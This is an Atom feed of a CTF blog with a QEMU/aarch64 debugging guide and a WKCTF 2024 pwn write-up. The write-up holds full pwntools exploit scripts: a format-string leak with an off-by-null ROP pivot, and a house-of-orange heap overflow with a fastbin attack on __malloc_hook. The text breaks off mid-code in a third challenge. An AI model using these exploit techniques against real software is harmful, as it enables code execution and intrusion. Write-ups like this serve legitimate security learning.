<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>StarrySky</title>
  
  <subtitle>StarrySky&#39;s zone</subtitle>
  <link href="https://starrysky1004.github.io/atom.xml" rel="self"/>
  
  <link href="https://starrysky1004.github.io/"/>
  <updated>2024-07-16T17:32:26.950Z</updated>
  <id>https://starrysky1004.github.io/</id>
  
  <author>
    <name>StarrySky</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>异构pwn运行与调试</title>
    <link href="https://starrysky1004.github.io/2024/07/16/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/"/>
    <id>https://starrysky1004.github.io/2024/07/16/yi-gou-pwn-yun-xing-yu-diao-shi/yi-gou-pwn-yun-xing-yu-diao-shi/</id>
    <published>2024-07-16T15:11:50.000Z</published>
    <updated>2024-07-16T17:32:26.950Z</updated>
    
    <content type="html"><![CDATA[<p>每次比赛碰到异构就直接放弃，趁暑假准备学一下异构程序的运行和调试。未完待续…</p><h2 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h2><h3 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#必要环境</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">make</span> ninja-build pkg-config libglib2.0-dev bison flex<span class="token comment">#安装qemu</span><span class="token function">wget</span> https://download.qemu.org/qemu-9.0.1.tar.xz<span class="token function">tar</span> xvJf qemu-9.0.1.tar.xz<span class="token builtin class-name">cd</span> qemu-9.0.1./configure<span class="token function">make</span> <span class="token parameter variable">-j8</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-g</span> <span class="token number">1234</span> <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc/libc/lib/libc-2.21.so<span class="token comment">#连接到正在运行的pwn，端口为qemu指定的端口</span>target remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;每次比赛碰到异构就直接放弃，趁暑假准备学一下异构程序的运行和调试。未完待续…&lt;/p&gt;
&lt;h2 id=&quot;aarch64&quot;&gt;&lt;a href=&quot;#aarch64&quot; class=&quot;headerlink&quot; title=&quot;aarch64&quot;&gt;&lt;/a&gt;aarch64&lt;/h2&gt;&lt;h3 id=</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="异构" scheme="https://starrysky1004.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>2024WKCTF-PWN</title>
    <link href="https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/"/>
    <id>https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/</id>
    <published>2024-07-16T08:41:29.000Z</published>
    <updated>2024-07-17T07:27:58.291Z</updated>
    
    <content type="html"><![CDATA[<p>题目下载地址：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF</a></p><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33688</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'continue'</span><span class="token punctuation">,</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'number'</span><span class="token punctuation">,</span> <span class="token string">b'6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'is: '</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ec7e3</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.27/libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseret <span class="token operator">=</span> <span class="token number">0x00000000000008aa</span> <span class="token operator">+</span> libc_baser<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'256)? '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">31</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>漏洞点出在<code>edit</code>可以堆溢出</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  _DWORD size<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Index :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Size :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0x1000u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"too large"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Content :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> chunk_ptr<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> size<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>size<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有<code>delete</code>且限制了<code>show</code>的长度为一个地址，首先想到的就是<code>house of orange</code></p><p>伪造<code>top chunk</code>的条件：</p><ul><li>保证原本<code>old top chunk</code>的<code>size</code>大于<code>MINSIZE</code></li><li>保证原本<code>old top chunk</code>的<code>prev_inuse</code>位是<code>1</code></li><li>原本<code>old top chunk</code>的地址加上其<code>size</code>之后的地址要与页对齐 也就是<code>address &amp; 0xfff = 0x000</code></li><li><code>old chunk</code>的<code>size</code>要小于申请的堆块大小加上<code>MINSIZE</code></li></ul><p>当申请的堆大小大于伪造的<code>top chunk</code>大小时会将<code>top chunk</code>释放，释放的大小为<code>top chunk size - 0x20</code>，并且根据释放的大小判断进入<code>fastbin</code>或者<code>unsorted bin</code></p><p>所以本题可以先释放一次<code>top chunk</code>到<code>unsorted bin</code>泄露<code>libc</code>，再释放一次<code>top chunk</code>到<code>fastbin</code>进行<code>fastbin attack</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'110.40.35.73'</span><span class="token punctuation">,</span> <span class="token number">33747</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1b8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3c4b61</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.23/libc-2.23.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45226</span><span class="token punctuation">,</span> <span class="token number">0x4527a</span><span class="token punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x148</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x148</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// x19</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [xsp+FCCh] [xbp+2Ch]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [xsp+FD0h] [xbp+30h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [xsp+FF8h] [xbp+58h]</span>  v7 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token 